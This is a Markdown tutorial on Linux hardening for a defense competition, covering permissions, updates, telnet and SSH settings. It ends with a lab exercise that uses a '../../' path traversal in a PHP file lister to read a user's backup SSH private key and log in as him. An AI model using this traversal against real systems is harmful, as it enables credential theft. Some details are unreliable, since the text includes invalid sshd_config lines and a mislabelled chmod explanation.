<!--This work is licensed under the Creative Commons Attribution-NonCommercial-ShareAlike 3.0 Unported License. To view a copy of this license, visit http://creativecommons.org/licenses/by-nc-sa/3.0/.-->
#Linux Security [ETC: 2 hours]
##Users
####Root
Root is the super user with a uid of 0, this user has all privileges but will rarely be used in a secure unix enviroment.
####User Information
User information is typically stored in two places
~~~
	/etc/passwd
	/etc/shadow
~~~
The passwd file stores user information including name, uid (a unique identefier for each user) and home directory while the shadow file stores an copy of the encrypted password for that user.
Learn more about why the shadow copyies exist [here](http://en.wikipedia.org/wiki/Passwd#Shadow_file)
####Useful Commands
* __su [username]__ : when passed a username will attempt to switch to that user, requiring the new users password. When entered without a user will attempt to switch to the root user.
* __whoami___ : prints your current username
* __id__ : prints your current uid and gid  

##Groups
In addition to assigned permissions based on users, unix systems can assign permissions based on groups which apply to all members of the group.
####Group Information
Group information is stored in
~~~
	/etc/group
~~~
But a primary group is also listed in the passwd file for each user. Users can be members of any number of groups.
####Useful Commands
To find all the groups that a given user is part of, first find their uid by looking in the passwd file and then use the command
~~~
	groups [uid]
~~~
##File Permissions
Permissions are stored for each file in three bits(r,w,x for read, write, and execute) each for the owner(u), the group(g), and the others(o)  
For example in the terminal capture below the array file has user(rwx),group(rx),other(rx)
~~~
	$ ls -la
	total 46
	drwxr-xr-x  3 steeler2 students    14 May  6 19:56 .
	drwx-----x 77 steeler2 students   105 May  7 01:56 ..
	-rwxr-xr-x  1 steeler2 students  8769 Apr 19 14:53 array
	-rw-r--r--  1 steeler2 students   147 Apr 19 14:53 array.c
~~~
In order to change array from being able to be exectued by anyone but the owner we can issue the command
~~~
	$ chmod go-x array
	$ ls -la
	total 46
	drwxr-xr-x  3 steeler2 students    14 May  6 19:56 .
	drwx-----x 77 steeler2 students   105 May  7 01:56 ..
	-rwxr--r--  1 steeler2 students  8769 Apr 19 14:53 array
	-rw-r--r--  1 steeler2 students   147 Apr 19 14:53 array.c
~~~
Where go specifices changing permissions for __g__roup and __u__ser to remove (-) the x (execute) permission flag.
###What file permissions should I set?
If the file is only for use by you then setting
~~~
	$ chmod go-rwx <files>
~~~
is a fine and secure idea. Many times we will be working with files that need to be world readable but must still be kept secure. Files like php scripts need to be executed but should not be written or read by other users. In this case a permission set like
~~~
	$ chmod u+rwx <files>
	$ chmod go+x <files>
	$ ls -la
	total 46
	drwxr-xr-x  3 steeler2 students    14 May  6 19:56 .
	drwx-----x 77 steeler2 students   105 May  7 01:56 ..
	-rwx--x--x  1 steeler2 students  8769 Apr 19 14:53 page.php
~~~
would suffice.
##Software
####Keeping everything up to date
This will require different commands based on any number of package managers available but some of the common ones are apt-get, yum, pacman, and ports. For our example apt-get is the package manager installed. To update the software list and use the new information to install available upgrades use the following commands:
~~~
	sudo apt-get update
	sudo apt-get upgrade
~~~
####Removing unnessecary software
You can identify software that is listening on an internet port by running the command
~~~
	sudo netstat -antlup
~~~
(remove the l flag for non-listening ports as well)  
Then, depending on the result, services can be stopped with the command
~~~
	sudo service <service> stop
~~~
or software can be completely uninstalled with the command
~~~
	sudo apt-get purge <software>
~~~
It can be a good idea to remove even seemingly benign software that is running on machines that don't need it because it could potentially introduce a new attack vector into the system.
####Inetd
Inetd is a superserver on many unix systems that controls many small network services. inetd can usually be found at
~~~
	/usr/sbin/inetd
~~~
The kinds of services inetd controls are FTP, Telnet, and sometimes SSH among others. Telnet is, by its very nature, an unsecure means of communication between hosts so this should be disabled. This can be done by editing the file
~~~
	/etc/inetd.conf
~~~
and commenting out the telnet reference lines which could like like the following depending on the system configuration:
~~~
	telnet          23/tcp
	telnet  stream  tcp6    nowait  root    /usr/sbin/telnetd      telnetd -a
~~~
####Identifying Malicious Software
Many times by the time malicious software is able to be run on your system the attacker already has a foothold and will be difficult to get rid of. But lets look at a case that the malicious software is installed and operating but the attacker is not in communication with the host yet.  
Running the command
~~~
	netstat -antup
~~~
__Need fixup___
Will show the current active connections to and from the host as well as the ports that the host is listening on. If the attacker hops to communicate with the host the program will probably show up here. Unknown programs (or 'known' programs that could have been repalced) communicating or listening on ports they should not be and talking to addresses they should not be are good clues that malicious software exists. The name of the software will be shown along with it's pid which can be used to find the location it is being run from as well as find it's current permissions and kill the process.
####Software Resources
Below common software is listed with guides to hardening that specific hardware. Many of this software is updated often and these guides may no longer be relevant.
* __Apache__: [Symantic's guide](http://www.symantec.com/connect/articles/securing-apache-2-step-step)
* __MySql__: [Securing initial users](http://dev.mysql.com/doc/refman/5.0/en/default-privileges.html) and [Symantic's in depth guide](http://www.symantec.com/connect/articles/securing-mysql-step-step)
* __PHP__: [Securing php](http://www.cyberciti.biz/tips/php-security-best-practices-tutorial.html)  

##Remote Access
One remote access service we __do__ want installed in an SSH server. On many unix systems and package managers the default server is OpenSSH so we will quickly learn to secure this server.
####Note: Practical vs Competition
Some things in this guide are specific to the competition and do not reflect real-world security practices
###Configuration
####Using a non-standard port
This will be discovered so quickly that it's almost not worth doing. It will, in the real world, however, prevent 99% of automated bruteforce bots from attempting to log in to your system. This won't be a problem because you will pick good passwords but it's better to be safe.  
####Limit users and groups
Adding lines in the ssh configuration file like
~~~
	AllowUsers ccdc
~~~
Will prevent users like maliciousdude from logging in even if they have a system account and valid credentials.
####Disabling Key Based Authentication
This is very specific to this system. Typically a key based approach will actually increase security but in this case rotating passwords and preventing anyone from being able to use aquired keys will be to our benefit. The ssh configuration file will need to be edited to change or add the following lines
~~~
	pubkey authentication no
	force version 2
~~~
##Exercise
To demonstrate the importance of the above we will assume our server has been configured incorrectly, especially by the lazy server admin named bozo. Bozo assumes his server is secure and has mistakenly granted all permissions to his home folder (why not? he is the only one who has access to the server anyway).  
We will use the webserver to gain access to his home folder and steal the private keys that will all us to log in as him even without a password. Navigate to:
~~~
	http://yourvm/files.php
~~~
We can see that it lists all files in the current directory with . as the 'dir' parameter but we would like to get to /home/bozo, try:
~~~
	http://yourvm/files.php?dir=/home/bozo
~~~
Well that didn't work, but we can try other ways of navigating the file system that may not be caught by this simple script:
~~~
	http://yourvm/files.php?dir=../../home/bozo
~~~
There we go! We can see bozo's home files, lets look for ssh keys
~~~
	http://yourvm/files.php?dir=../../home/bozo/.ssh
~~~
__id_rsa__ is what we're looking for but often without user level access this file must be protected, luckily bozo stores a backup
~~~
	http://yourvm/files/php?dir=../../home/bozo/.ssh/id_rsa_backup
~~~
Copy this file down to /home/you/.ssh/id_rsa and try to log in
~~~
	ssh bozo@yourvm
~~~
Congratulations!
